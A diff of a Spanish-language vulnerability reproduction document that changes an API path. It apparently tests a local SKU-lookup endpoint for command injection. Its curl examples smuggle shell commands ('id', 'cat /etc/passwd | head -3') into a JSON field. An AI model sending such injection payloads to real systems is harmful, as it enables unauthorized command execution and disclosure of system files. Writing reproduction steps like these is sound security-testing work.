@@ -132,13 +132,13 @@ JWT=$(curl -s -X POST http://localhost:5000/api/auth/login \
 **Pasos**
 1. Comando simple:
    ```bash
-   curl -s -X POST http://localhost:5000/api/automobile/sku-lookup \
+   curl -s -X POST http://localhost:5000/api/inventory/sku-lookup \
      -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
      -d '{"sku":"id"}'
    ```
 2. Lectura de archivos o cadena de comandos:
    ```bash
-   curl -s -X POST http://localhost:5000/api/automobile/sku-lookup \
+   curl -s -X POST http://localhost:5000/api/inventory/sku-lookup \
      -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
      -d '{"sku":"cat /etc/passwd | head -3"}'
    ```
